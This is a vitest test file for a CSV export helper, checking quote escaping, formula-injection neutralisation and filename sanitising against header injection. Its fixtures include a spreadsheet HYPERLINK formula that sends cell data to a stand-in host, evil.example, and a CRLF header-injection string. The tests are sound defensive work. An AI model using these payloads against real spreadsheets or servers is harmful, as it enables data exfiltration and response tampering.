import { describe, it, expect } from 'vitest';
import { csvField, sanitizeFilenamePart } from './csv';

/**
 * The hard rule: nothing that leaves here can act as anything other than
 * text.
 *
 * Every export in this application is built for a spreadsheet, and the
 * fields going into it are planner-entered free text (codenaam, period
 * name, a reason). Two things can escape a CSV cell: a leading character
 * that makes the cell a formula, and an unescaped quote that ends the
 * field early and lets the rest be read as more columns.
 *
 * This module had no test of its own, even though four export routes and
 * the preference backups all rely on it.
 */

describe('csvField', () => {
  it('quotes an ordinary value', () => {
    expect(csvField('Persoon-01')).toBe('"Persoon-01"');
  });

  it('doubles an embedded quote, per RFC 4180', () => {
    // Without this the field ends at the first quote and everything after
    // it is read as further columns.
    expect(csvField('Persoon "de nachtwacht" 01')).toBe('"Persoon ""de nachtwacht"" 01"');
  });

  it('neutralises every character that starts a formula', () => {
    // =, +, - and @ each make a cell a formula in Excel, Numbers and
    // Sheets; tab and CR are treated the same way by some of them.
    for (const trigger of ['=', '+', '-', '@', '\t', '\r']) {
      const field = csvField(`${trigger}SUM(A1:A9)`);
      expect(field.startsWith(`"'${trigger}`), JSON.stringify(trigger)).toBe(true);
    }
  });

  it('neutralises the classic exfiltration one-liner', () => {
    const field = csvField('=HYPERLINK("http://evil.example?x="&A1,"klik hier")');
    expect(field.startsWith(`"'=`)).toBe(true);
    // The guard and the quote escaping have to both apply, not one or the
    // other.
    expect(field).toContain('""http://evil.example');
  });

  it('leaves a trigger character alone when it is not at the start', () => {
    // "Persoon-01" must not gain an apostrophe; only a *leading* trigger
    // turns a cell into a formula.
    expect(csvField('Persoon-01')).toBe('"Persoon-01"');
    expect(csvField('2027-1')).toBe('"2027-1"');
    expect(csvField('a+b')).toBe('"a+b"');
  });

  it('renders null, undefined and numbers the way the exports expect', () => {
    expect(csvField(null)).toBe('""');
    expect(csvField(undefined)).toBe('""');
    expect(csvField(0)).toBe('"0"');
    expect(csvField(42)).toBe('"42"');
  });

  it('guards a negative number too, since it starts with a minus', () => {
    // Deliberately true: a bare -1 in a cell is a formula as far as a
    // spreadsheet is concerned. The exports show balances in words
    // anyway (CLAUDE.md), so nothing legitimate depends on -1 staying
    // numeric here.
    expect(csvField(-1)).toBe(`"'-1"`);
  });
});

describe('sanitizeFilenamePart', () => {
  it('keeps an ordinary period name unchanged', () => {
    expect(sanitizeFilenamePart('2027-1')).toBe('2027-1');
  });

  it('removes what would break out of a quoted Content-Disposition filename', () => {
    // A quote ends the filename early; a CR/LF splits the response header
    // in two, which is header injection.
    expect(sanitizeFilenamePart('a"b')).toBe('a_b');
    expect(sanitizeFilenamePart('a\\b')).toBe('a_b');
    expect(sanitizeFilenamePart('a\r\nb')).toBe('a__b');
    expect(sanitizeFilenamePart('x"\r\nContent-Type: text/html')).not.toContain('\n');
  });
});
